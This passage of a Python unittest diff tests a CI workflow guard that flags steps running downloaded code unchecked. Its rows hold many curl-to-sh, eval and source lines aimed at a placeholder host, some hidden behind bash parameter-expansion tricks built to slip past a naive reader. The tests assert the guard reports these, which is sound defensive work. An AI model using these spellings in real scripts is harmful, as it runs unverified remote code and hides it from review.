+    CHECK = ('echo "%s  tool" > sums\n' % ("a" * 64) + GET + "sha256sum tool > self\nsha256sum -c %s\nsh tool")
+    SELF = (("0<> sums < self", SHELLS), ("<> sums 0< self", SHELLS),             # CZ003b, CZ004b
+            ("4< self 0<> sums <&4", SHELLS), ("self 0<> sums", SHELLS),          # CZ006b, CZ007b
+            ("self <> sums", SHELLS), ("0<> sums 0<> self", SHELLS),              # CZ008b, CZ009b
+            ('0<> sums <<< "$(cat self)"', (None, "bash")),                       # CZ011b RRRRsRRs
+            ("/dev/stdin 0<> sums < self", SHELLS), ("0<> sums 3< self <&3", SHELLS),  # CZ015b, CZ017b
+            ("00<> sums < self", (None, "bash", "bash {0}", "sh {0}")))           # CZ018b RRRRsRRR
+    # CZ001b, CZ002b, CZ014b (sssssRRR), and two of my own: the list named by its stdin spellings.
+    SUMS = ("<> sums", "0<> sums", "- 0<> sums", "/dev/stdin 0<> sums", "/dev/fd/0 0<> sums")
+
+    def test_a_default_ending_in_its_program_names_it(self):
+        for row in self.STRIPPED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        for shell in self.BASH:                     # rx-h RRRR-RR-: bash's array; dash rejects the word
+            with self.subTest(row="rx-h", shell=shell):
+                self.assertTrue(reported("${X[0]:-/usr/bin/env bash} <<'EOF'\n%s\nEOF\necho done\n" % PIPE, shell))
+
+    def test_a_default_bash_never_expands_names_nothing(self):
+        for row in self.NEVER:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_a_word_that_expands_to_nothing_hands_on_to_the_next(self):
+        for row in self.UNSET:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        for shell in self.BASH:                     # gc-s1-e2 RRRR-RR-: dash rejects `${X/a/…}`
+            with self.subTest(row="gc-s1-e2", shell=shell):
+                self.assertTrue(reported("${X/a/env true}sh -c '%s'\necho done\n" % PIPE, shell))
+
+    def test_a_step_that_sets_the_name_runs_the_alternate(self):
+        for row in self.SET:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        # Moved in round 13 by the round-12 ruling: "The `SET_RUNS_NOTHING` pins become over-reports.
+        # Change them to assert the REPORT, and name the class in the CHANGELOG as fail-closed." Both
+        # halves are read, and the next word, a shell, runs more than `true`.
+        for row in self.SET_RUNS_NOTHING:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_glued_literal_takes_no_glob_and_a_glued_substitution_joins(self):
+        for row in self.GLUED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_check_reads_what_zero_holds_only_where_it_reads_its_input(self):
+        for shape, shells in self.SELF:
+            for shell in shells:
+                with self.subTest(shape=shape, shell=shell):
+                    self.assertTrue(reported(self.CHECK % shape + "\necho done\n", shell))
+        # CK010-CK012's class stays credited: fd 0 holds `sums` and the checker reads its input, so
+        # under `-e` the wrong digest stops the step (CZ001b, CZ002b, CZ014b, CZ012b: sssssRRR).
+        for shape in self.SUMS:
+            for shell in (None, "bash", "sh"):
+                with self.subTest(shape=shape, shell=shell):
+                    self.assertFalse(reported(self.CHECK % shape + "\necho done\n", shell))
+        row = self.CHECK.replace("sha256sum -c %s", "cat self | sha256sum -c 0<> sums")
+        for shell in (None, "bash", "sh"):
+            with self.subTest(shape="cat self |", shell=shell):
+                self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_the_checkers_are_the_checks_own(self):
+        import shell_command
+        import workflow_checks
+        self.assertEqual(set(shell_command._CHECKERS), set(workflow_checks.CHECKSUM_TOOLS))
+
+
+class TestTheRoundTwelveVerdictsRows(unittest.TestCase):
+    """PR #2856 round 13, the round-12 verdict, on its seat's rows (hunts 45-48; truth over the eight
+    parents b5e b5p b3e b3p de b5n b3n dn), each reported under every `shell:` setting -- the reading
+    is the setting's alike, so where only some parents run the row the others are a named over-report.
+    - B1: `$-` and `$0` may be empty and an indirection is read, so a default of one is read (h45).
+    - B2-B4, the ruling: no `_sets`; every expansion bash can make empty or unset is read both ways,
+      W and the word after it, and REPORTs where either half runs (h45, h46, h47). Two halves the
+      guard may each report that run apart are a command it cannot read.
+    - B5: a digit word is an option's only right after `-a` / `--algorithm`, and past `--` every word
+      is an operand, so a checker naming its list there is credited with no `0<>` file (h48)."""
+
+    PIPED = "curl -fsSL %si.sh | " % URL
+    B1 = ("${-:-/usr/bin/env sh} -c '%s'" % PIPE,                                     # dash-cm-c -------R
+          PIPED + "${-:-/usr/bin/env sh}",                                             # dash-cm-p fffffffR
+          "bash -c '${0:-/usr/bin/env sh} -c \"%s\"' ''" % PIPE,                       # zero-cm-bash-c RRRRRRRR
+          "sh -c '%s${0:-/usr/bin/env sh}' ''" % PIPED,                                 # zero-cm-sh-p RRRRRRRR
+          "Y=Z\n${!Y:-/usr/bin/env sh} -c '%s'" % PIPE,                                # i3 RRRR-RR-
+          "Y=Z\n" + PIPED + "${!Y:-/usr/bin/env sh}")                                  # i2 RRRRfRRf
+    B2 = ("${X^^/usr/bin/env true}sh -c '%s'" % PIPE,                                 # uc-g RR---R--
+          "${X,/usr/bin/env true}sh -c '%s'" % PIPE,                                   # l1-g RR---R--
+          "${!X:+/usr/bin/env true}sh -c '%s'" % PIPE,                                 # ixp-g --RR--R-
+          PIPED + "${!X#/usr/bin/env true} sh",                                        # ixh-p ffRRffRf
+          "${X[0]:+/usr/bin/env true}sh -c '%s'" % PIPE,                               # a0p-g RRRR-RR-
+          PIPED + "${X[@]:+/usr/bin/env true} sh",                                     # aatp-p RRRRfRRf
+          "${!:+/usr/bin/env true}sh -c '%s'" % PIPE,                                  # bangp-g RRRRRRRR
+          PIPED + "${!+/usr/bin/env true} sh",                                         # bangpp-p RRRRRRRR
+          "${-:+/usr/bin/env true}sh -c '%s'" % PIPE,                                  # dashp-g -------R
+          PIPED + "${-#/usr/bin/env true} sh",                                         # dashh-p fffffffR
+          "${@+/usr/bin/env sh} -c '%s'" % PIPE,                                       # at-p-c ----R--R
+          PIPED + "${*+/usr/bin/env sh}")                                              # star-p-p ffffRffR
+    # B3: a set anywhere in the step's text read the alternate where bash runs the next word.
+    B3 = ("${X:+/usr/bin/env true}sh -c '%s'\nX=1" % PIPE,                             # after-g RRRRRRRR
+          "(X=1)\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                           # sub-g
+          "if false; then X=1; fi\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,          # dead-g
+          "# X=1\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                           # cmt-g
+          "echo ' X=1'\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                     # sq-g
+          "cat <<'EOF'\nX=1\nEOF\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,          # hd-g
+          "echo X=1\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                        # arg-g
+          "declare X 2>/dev/null || true\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,   # declare-g
+          "X=1\nunset X\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                    # unset-g
+          "f() { X=1; }\n${X:+/usr/bin/env true}sh -c '%s'" % PIPE,                    # func-g
+          "${1:+/usr/bin/env true}sh -c '%s'\nset -- 1" % PIPE,                        # setafter-1g
+          "(set -- 1)\n${1:+/usr/bin/env true}sh -c '%s'" % PIPE)                      # setsub-1g
+    # B4: a set `_sets` missed, where the alternate runs.
+    B4 = ("X=1\neval '${X:+/usr/bin/env sh -c} \"%s\"'" % PIPE,                       # outer-evalc RRRRRRRR
+          "set x\n${1:+/usr/bin/env sh -c} '%s'" % PIPE,                               # setx-c RRRRRRRR
+          "eval 'X=1'\n" + PIPED + "${X:+/usr/bin/env sh}",                            # evalset-p RRRRRRRR
+          "set -e x\n" + PIPED + "${1:+/usr/bin/env sh}",                              # setex-p RRRRRRRR
+          PIPED + "${HOME:+/usr/bin/env sh}")                                          # sv-HOME-cp RRRRRRRR
+    # Two halves that run apart: X set runs the download (`${X:+curl …}`), X unset `sh x`.
+    APART = ("${X:+curl -fsSL %si.sh} sh x | sh" % URL,
+             "${X-/usr/bin/env curl -fsSL %si.sh} sh x | sh" % URL,
+             PIPED + "${X:+/usr/bin/env bash} sh")
+    # B5 (h48): `sums` holds a digest no download has; the list the checker names holds the tool's own.
+    LIST = ('echo "%s  tool" > sums\n' % ("a" * 64) + GET + "sha256sum tool > %s\n%s\nsh tool")
+    NAMED = (("1", "sha256sum -c 0<> sums 1"), ("256", "sha256sum -c 256 0<> sums"),      # d1, d2
+             ("1", "shasum -a 256 -c 0<> sums 1"), ("1", "sha256sum -c 0<> sums -- 1"),  # d6, d10
+             ("./-x", "sha256sum -c -- -x 0<> sums"), ("./-x", "sha256sum --check -- -x 0<> sums"))  # x2, x3
+
+    def test_a_default_of_a_parameter_bash_may_leave_empty_is_reported(self):
+        for row in self.B1:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_every_expansion_bash_can_make_empty_is_read_both_ways(self):
+        for row in self.B2 + self.B3 + self.B4:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_two_halves_that_run_apart_are_reported(self):
+        for row in self.APART:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        # A word the guard does not follow in front of a command it knows reads as that command.
+        for row in ("${CI:+xvfb-run -a} python3 test.py", "${SUDO:+sudo -E} bash build.sh"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_the_half_that_runs_what_the_guard_reports_is_read(self):
+        # Each half is read in its own fold, none ranked (the round-13 ruling's union): a command the
+        # guard cannot read beside a shell's kind (`env $(…)`), a shell's kind -- an unpacker too --
+        # beside a word it does not follow, that word with a `-c` after it beside any other command,
+        # and none beside a check, whose fold alone it credits: the other runs the download unchecked.
+        for row in ("${X:+env $(echo sh) -c} sh x",
+                    "curl -fsSLo t.tgz %st.tgz\n${X:+a b} tar xzf t.tgz" % URL,
+                    "${X:+echo hi} $Y -c '%s'" % PIPE,
+                    self.LIST.replace("sha256sum tool > %s\n%s", "${X:+/usr/bin/env sha256sum -c sums} true")):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_checker_naming_its_list_is_credited_with_no_zero_file(self):
+        for name, check in self.NAMED:
+            for shell in SHELLS:
+                with self.subTest(check=check, shell=shell):
+                    self.assertTrue(reported(self.LIST % (name, check) + "\necho done\n", shell))
+        # A digit word right after `-a` is the option's (Q1's credit, CK010-CK012's class): fd 0 holds
+        # `sums`, the checker reads it, and under `-e` the wrong digest stops the step.
+        row = self.LIST % ("1", "shasum -a 256 -c 0<> sums")
+        for shell in (None, "bash", "sh"):
+            with self.subTest(check="shasum -a 256 -c 0<> sums", shell=shell):
+                self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_the_unpackers_are_the_guards_own(self):
+        import shell_command
+        self.assertEqual(set(shell_command._UNPACKERS), set(workflow_uses.UNPACKERS))
+
+
+class TestTheUnionReadsBothHalves(unittest.TestCase):
+    """PR #2856 round 13, the round-13 ruling, Option 1: "Read both halves and union what they find
+    ('REPORT if either half runs'); do not rank." `shell_command.folds` reads a job with each command
+    word bash may expand to nothing as its W, then again with it empty. One row per half where only
+    that half runs the payload, each REPORT under every `shell:` setting: a reading that drops either
+    half's folds reads one of them CLEAN."""
+
+    ONLY_W = "X=1\n${X:+/usr/bin/env sh -c} '%s'" % PIPE        # X set: sh runs it; empty, no such command
+    ONLY_EMPTY = "${X:+/usr/bin/env true} sh -c '%s'" % PIPE   # X set: `true` runs nothing; unset, sh
+
+    def test_a_row_only_one_half_runs_is_reported(self):
+        for row in (self.ONLY_W, self.ONLY_EMPTY):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    # Round 14 (the round-13 verdict's B1, the seat's sh-ev-2 and its `source` / `.` twins): the
+    # payload runs only on a mixed reading -- the fetch's W and the shell's word expanded to
+    # nothing -- which neither of the union's folds read, and #2929's do; the conflict between
+    # `sh -c true` and `eval`, `source` or `.` reports it too.
+    MIXED = ('X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} eval "$(cat t.sh)"' % URL,
+             "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} source ./t.sh" % URL,
+             "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} . ./t.sh" % URL)
+
+    def test_a_conflict_reports_what_only_a_mixed_reading_runs(self):
+        for row in self.MIXED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestEveryMixedReadingIsRead(unittest.TestCase):
+    """#2929: the union read a job with every command word bash may expand to nothing as its W, then
+    with every one empty -- two of a step's 2^k readings -- so a payload only a mixed reading runs read
+    CLEAN. `shell_command.folds` now reads every set of such words whose halves read apart, up to
+    `_HALF_CAP`, each in a fold of its own, and a word past them reads as a command the guard cannot
+    read, wherever it runs."""
+
+    # The #2856 round-13 seat's hunts 49, 51 and 53: every parent runs each, and #2856 read each CLEAN.
+    SEAT = ("X=1\n${X:+curl -fsSLo tool https://example.test/tool}\n${Y:+/usr/bin/env true} sh tool",
+            "X=1\n${X:+curl -fsSL https://example.test/i.sh} | ${Y:+/usr/bin/env true} sh",
+            "Y=1\n${X:+/usr/bin/env true} curl -fsSL https://example.test/i.sh | ${Y:+/usr/bin/env sh}",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} . ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} eval "$(cat t.sh)"',
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+unzip -q t.zip} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} sh ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} source ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} eval "$(cat t.sh)"',
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} eval "$(cat t.sh)"')
+
+    def test_the_seats_rows_report(self):
+        for row in self.SEAT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    @staticmethod
+    def three(fetch, check, run):
+        """A row three such words decide, each read as `W` or `E` where the payload runs: a fetch, a
+        check that clears it where it runs, and a shell that runs it; the name of each `W` set."""
+        words = {("A", "W"): "${A:+curl -fsSLo t.sh %st.sh}" % URL,
+                 ("A", "E"): "${A:+/usr/bin/env true} curl -fsSLo t.sh %st.sh" % URL,
+                 ("C", "W"): "${C:+/usr/bin/env true} sha256sum -c sums", ("C", "E"): "${C:+sha256sum -c sums}",
+                 ("B", "W"): "${B:+sh t.sh}", ("B", "E"): "${B:+/usr/bin/env true} sh t.sh"}
+        names = [(name, half) for name, half in (("A", fetch), ("C", check), ("B", run))]
+        return ("".join("%s=1\n" % name for name, half in names if half == "W")
+                + "echo '%s  t.sh' > sums\n" % ("a" * 64) + "\n".join(words[place] for place in names))
+
+    def test_every_assignment_of_three_words_is_read(self):
+        # Each row runs only where its three words read as written -- W, W, E and the rest -- and the
+        # union read two of the eight; every one reports now, under every setting.
+        for fetch in "WE":
+            for check in "WE":
+                for run in "WE":
+                    row = self.three(fetch, check, run)
+                    for shell in SHELLS:
+                        with self.subTest(fetch=fetch, check=check, run=run, shell=shell):
+                            self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_word_past_the_cap_is_one_the_guard_cannot_read(self):
+        # Fail-closed, past `_HALF_CAP` such words, wherever the job runs, a download or none: the
+        # price. Three read every way, and nothing runs here. The sets the folds read are the first
+        # three's (`_masks`), and the words past them are still read, each with the cap's reason.
+        import shell_command
+        self.assertEqual(3, shell_command._HALF_CAP)
+        line = "${V%d:+/usr/bin/env echo} make t%d\n"
+        for count in (1, 3, 4, 8, 50, 200):     # one word, read again in each fold, is one place
+            with self.subTest(count=count):
+                found = wg.job_defects([wg.Step("step", "".join(line % (n, n) for n in range(count)), None)])
+                self.assertEqual(count > 3, bool(found))
+                reasons = " ".join(why for _name, why in found)
+                for past in range(3, count):        # each word past the cap, none cut
+                    self.assertIn("`${V%d:+/usr/bin/env echo}` is a command word bash may expand to nothing "
+                                  "beside 3 more" % past, reasons)
+
+    @staticmethod
+    def folds(texts):
+        """The number of folds `folds` reads, `texts` each parsed and read in every fold, and the words
+        whose halves read apart it met, by place."""
+        import shell_command
+        counts = []
+        for _sure in shell_reader.folds(lambda: False):
+            for text in texts:
+                for statement in shell_reader.statements(text):
+                    for stage in statement.stages:
+                        shell_reader.command(stage.argv)
+            counts.append(len(shell_command._HALVES["words"]))
+        return len(counts), counts[-1]
+
+    # The #2939 round-1 seat's shape: a word whose W fetches t.sh (the URL's fragment holds `./t.sh`)
+    # and whose empty half runs it, so the payload runs only where one place reads W and another empty.
+    PREP = "printf '' > t.sh\nchmod +x t.sh\n"
+    W = "${X:+curl -fsSLo t.sh %st.sh#}./t.sh" % URL
+
+    def test_a_word_is_one_word_however_often_its_text_is_read(self):
+        # By its place -- where its parse stands, a lifted text at its place in the text that lifted
+        # it, a step at its index (`shell_tokens._Parse.place`) -- and its order there, never what the
+        # text says: a text read twice in a fold holds one word, and a spelling written at two places
+        # is two, read every way (the seat's IdB.two.subst, IdB.two.back, IdC.subst-mixed,
+        # IdC.subst-echo, IdC.subst-proc and IdB.two.same-parse; every parent runs each).
+        once = "${X:+/usr/bin/env true} sh t\n"
+        self.assertEqual((2, 1), self.folds([once, once]))
+        self.assertEqual((4, 2), self.folds([once * 2]))
+        w = self.W
+        repeat = "${X:+curl -fsSLo t %st} sh t" % URL       # round 1's row: it reports on every tree
+        for row in ("X=1\n%s\nunset X\n%s\necho done" % (repeat, repeat),
+                    "X=1\nv=$(%s)\nunset X\nv=$(%s)" % (w, w), "X=1\nv=`%s`\nunset X\nv=`%s`" % (w, w),
+                    "X=1\nv=$(%s)\nunset X\nw=`%s`" % (w, w), 'X=1\necho "$(%s)"\nunset X\necho "$(%s)"' % (w, w),
+                    "X=1\ncat <(%s) >/dev/null\nunset X\ncat <(%s) >/dev/null" % (w, w), "X=1\n%s\nunset X\n%s" % (w, w)):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(self.PREP + row + "\n", shell))
+
+    def test_two_steps_of_one_text_are_two_places(self):
+        # MS.same: a job's steps are read at their index (`placed`), so two steps of one text hold two
+        # words (the seat runs the second with `X=1` in its environment, and every parent runs it); a
+        # step's own place is never a text read alone's, nor another step's, nor another text's.
+        import shell_tokens
+        text = self.W + "\n"
+        steps = [wg.Step("prep", self.PREP, None), wg.Step("one", text, None), wg.Step("two", text, None)]
+        self.assertTrue(wg.job_defects(steps))
+        places = {shell_tokens._Parse(t).place for t in (text, shell_reader.placed(text, 0),
+                                                         shell_reader.placed(text, 1), text + " ")}
+        self.assertEqual(4, len(places))
+
+    def test_a_program_a_shell_reads_on_its_standard_input_keeps_its_place(self):
+        # IdB.two.heredoc and the hunt's P2-hd, P2-hdbash and P2-hs rows: a heredoc's body, a
+        # here-string's too, that a shell reads as its program stands where its parent lifted it
+        # (`workflow_programs.stdin_scripts`, `at_place`), so two of one text are two places -- main
+        # and round 1 read each CLEAN while the parents run it. With a blank more in one of the two
+        # the pair reports as it did (the hunt's P1 rows), and with nothing downloaded each reads
+        # CLEAN (its B rows). So too the heredoc a FILE program's shell reads (`bash <(echo 'sh')
+        # <<'EOF'`, the function's second `at_place`), and one a `cat` prints into a `<(…)`.
+        w, fetch, bash = self.W, "curl -fsSLo t.sh %st.sh#" % URL, (None, "bash", "bash {0}")
+        env, moved = "X=1 %s\n%s", "X=1\nexport X\n%s\nunset X\n%s"
+        for form, shells in (("sh <<'EOF'\n%s\nEOF", SHELLS), ("bash <<'EOF'\n%s\nEOF", SHELLS),
+                             ("sh <<< '%s'", bash),                # `<<<` and `<(…)` are bash's
+                             ("bash <(echo 'sh') <<'EOF'\n%s\nEOF", bash), ("bash <(cat <<'EOF'\n%s\nEOF\n)", bash)):
+            one = form % w
+            for row in (env % (one, one), moved % (one, one), moved % (one, form % (w + " "))):
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(self.PREP + row + "\n", shell))
+                        self.assertFalse(reported(self.PREP + row.replace(fetch, "echo ") + "\n", shell))
+
+    def test_a_reader_nonce_splits_no_word(self):
+        # Idnonce.k1.nodl and Idnonce.k1.proc: a heredoc marker's random hex inside a `$(…)` or `<(…)`
+        # text reached the key, so one word was a new one at every parse, and the cap reported a job
+        # nothing runs; read by place, each is one word, CLEAN as `main` reads it.
+        for row in ("v=$(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\necho \"$v\"\n",
+                    "cat <(cat <<'EOF'\nhello\nEOF\n${Y:+/usr/bin/env true} echo hi)\n"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual([], wg.job_defects([wg.Step("step", row, shell)]))
+
+    def test_only_the_readers_own_nonce_leaves_a_text_key(self):
+        # A program string is keyed by its text (the named limit), less the reader's own nonce and
+        # nothing else (round 3, B1): a marker of the reader's keeps its number and loses its nonce,
+        # whichever parse minted it, so its text read again keeps one key; text of the target's that
+        # is only shaped like a marker stays, at any width, so two such texts keep two keys.
+        import shell_text
+        import shell_tokens
+
+        def marker(number):
+            parse = shell_tokens._Parse("echo hi")
+            return [parse.new("subst", shell_text.Lifted("true", {})) for _ in range(number + 1)][-1]
+        first, again, other = (shell_tokens._Parse("sh " + marker(n)).place for n in (0, 0, 1))
+        self.assertEqual(first, again)
+        self.assertNotEqual(first, other)
+        self.assertNotIn(shell_tokens._OURS, first[1])
+        for width in (2, 32, 48):
+            with self.subTest(width=width):
+                one, two = (shell_tokens._Parse("echo @@shell-%s-0@@" % (digit * width)).place for digit in "ab")
+                self.assertNotEqual(one, two)
+                self.assertEqual("echo @@shell-%s-0@@" % ("a" * width), one[1])
+
+    def test_text_shaped_like_a_marker_is_the_targets_own(self):
+        # D.shcd-litmark and D.evq-litmark (round 3, B1): two program strings that differ only in
+        # text shaped like the reader's marker are two words, as round 1 read them -- round 2 took
+        # every such text out of the key and read each pair CLEAN while every parent runs it. So at
+        # a nonce's width; one copy alone fetches, runs nothing and reads CLEAN.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        for runner in ("sh -c '%s'", "eval '%s'"):
+            for width in (2, 32, 48):
+                one, two = (runner % ("echo @@shell-%s-0@@ >/dev/null; %s; true" % (digit * width, self.W))
+                            for digit in "ab")
+                for shell in SHELLS:
+                    with self.subTest(runner=runner, width=width, shell=shell):
+                        self.assertTrue(reported(pair % (one, two), shell))
+                        self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\n" % one, shell))
+
+    def test_a_word_that_may_be_a_program_keeps_one_key_whatever_nonce_its_parent_minted(self):
+        # The reader's own nonce does leave the key: a word that may be a shell's program is read with
+        # its `$(…)` left as the marker the step's parse minted (`workflow_forms._weighed`), anew in
+        # every fold, so with the nonce in the key its one word was a new one each time and the cap
+        # reported a step that fetches nothing and runs nothing.
+        word = "\\${Y:+/usr/bin/env echo} make all"
+        for row in ('X=-c\nsh $X "echo $(date) >/dev/null; %s"\n' % word, 'X=-c\nsh $X "echo `date` >/dev/null; %s"\n' % word,
+                    'X=-c\nsh $X "$(echo true); %s"\n' % word, 'O=-c\nbash $O "echo $(uname) >/dev/null; %s"\n' % word):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertEqual([], wg.job_defects([wg.Step("step", row, shell)]))
+
+    def test_a_substitution_stands_under_its_parents_place(self):
+        # Round 3, B2: a `$(…)` takes its parent's place and its position there (`_Parse.new`), the
+        # whole chain of them, so one position under two parents is two places. Each pair runs the
+        # download under every parent, the first copy's W fetching and the second's empty half
+        # running; a place that dropped its parent, kept only the chain's root, or lost the middle of
+        # a chain two parses deep read each CLEAN (the round-2 seat's three mutants).
+        w = self.W
+        # Two steps of one text whose word stands in a `$(…)`, a backquote, a `<(…)` (M.subst.same,
+        # M.back.same, M.proc.same): the seat runs the first with `X=1` in its environment.
+        for text in ("v=$(%s)\n" % w, "v=`%s`\n" % w, "cat <(%s) >/dev/null\n" % w):
+            for shell in SHELLS:
+                with self.subTest(text=text, shell=shell):
+                    self.assertTrue(wg.job_defects([wg.Step("prep", self.PREP, shell), wg.Step("one", text, shell),
+                                                    wg.Step("two", text, shell)]))
+        # Two equal substitutions, each inside another, two deep and three (S.nest2, S.nest2b,
+        # S.nest3); two heredoc programs of one body whose word stands in a `$(…)` (I.substin) and
+        # two expanding heredocs that hold it (S.inhd); a step's own line and a `$(…)` that holds the
+        # same text (X.step+subst); and two program strings a blank apart that hold it
+        # (L.holdsubst.blank).
+        moved = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\n"
+        pairs = [(one, one) for one in ("v=$(echo $(%s; true))" % w, "v=$(echo `%s; true`)" % w,
+                                        "v=$(echo $(echo $(%s; true)))" % w, "sh <<'EOF'\nv=$(%s; true)\nEOF" % w,
+                                        "cat <<EOF >/dev/null\n$(%s; true)\nEOF" % w)]
+        pairs += [("%s; true" % w, "v=$(%s; true)" % w), ("sh -c 'v=$(%s; true)'" % w, "sh -c 'v=$(%s; true )'" % w)]
+        for one, two in pairs:
+            for shell in SHELLS:
+                with self.subTest(one=one, two=two, shell=shell):
+                    self.assertTrue(reported(moved % (one, two), shell))
+                    self.assertFalse(reported(self.PREP + "X=1\nexport X\n%s\n" % one, shell))
+
+    # The named limit's hunt (#2953): 9 spellings of a program string by 5 program shapes, none
+    # ending in the download's name -- one that does reports as one copy, on `main` too
+    # (`workflow_operands.covers` reads a `$` word ending in that name as a mention).
+    RUNNERS = ("sh -c '%s'", "bash -c '%s'", "eval '%s'", 'sh -c "%s"', 'eval "%s"', "env sh -c '%s'",
+               "bash -lc '%s'", "sh -ec '%s'")
+    SHAPES = ("%s; true", "%s && true", "true; %s; true", "( %s )", "%s >/dev/null")
+
+    def strings(self):
+        """Each program string of the limit's hunt, as the text a copy of it is written with."""
+        for shape in self.SHAPES:
+            for runner in self.RUNNERS:
+                yield lambda more="", shape=shape, runner=runner: runner % (shape % self.W + more)
+            yield lambda more="", shape=shape: 'sh -c "%s"' % (shape % self.W + more).replace("$", "\\$")
+
+    def test_two_identical_program_strings_at_two_places_are_one_word_2953(self):
+        # THE NAMED LIMIT, #2953 (the PR that hands a program string its place moves these rows to
+        # REPORT): a `-c` or an `eval` string reaches its parse by its text -- its parent's token,
+        # and `workflow_programs._parsed`, a cache keyed by the text -- so two byte-identical
+        # strings at two places are one word, and the payload their mixed reading runs (the first
+        # fetches, X set; the second runs it, X unset) reads CLEAN, as on `main`, while every parent
+        # runs it: all 45 pairs of the hunt, and an `eval` whose words bash joins.
+        pair = self.PREP + "X=1\nexport X\n%s\nunset X\n%s\necho done\n"
+        for string in self.strings():
+            for shell in SHELLS:
+                with self.subTest(string=string(), shell=shell):
+                    self.assertFalse(reported(pair % (string(), string()), shell))
+        join = "eval '%s;' 'true'" % self.W
+        self.assertFalse(reported(pair % (join, join)))
+
+    # The limit as wide as it is (round 3, B1): a string's own `$(…)`, backquote or `<(…)` is written
+    # `$(...)` in the text the reader is handed unless a printer spells it, so what stands inside one
+    # is no part of the key. What each of two strings holds in front of the word, by way of differing
+    # (the round-2 seat's D rows, and a `$(…)` against a backquote in its place).
+    INSIDE = (("v=$(true); ", "v=$(false); "), ("v=`true`; ", "v=`false`; "), ("v=$(true); ", "v=`true`; "),
+              ("cat <(true) >/dev/null; ", "cat <(false) >/dev/null; "),
+              ("v=$(tr a b <<'EOF'\none\nEOF\n); ", "v=$(tr a b <<'EOF'\ntwo\nEOF\n); "),
+              ("a=$(uname); b=$(uname); ", "a=$(uname -m); b=$(uname); "), ("v=$(echo $(true)); ", "v=$(echo $(false)); "))
+
+    def test_program_strings_alike_but_inside_a_substitution_are_one_word_2953(self):
+        # THE NAMED LIMIT, #2953 (the PR that hands a program string its place moves these rows to
+        # REPORT too): two program strings that read alike once each substitution no printer spells
+        # is written `$(...)` are one word -- identical strings, and strings that differ only inside
+        # such a substitution -- so the payload their mixed reading runs reads CLEAN, as on `main`,
+        # while a parent runs it: every pair here under `sh -c`, `bash -c` and `eval`, an `eval`
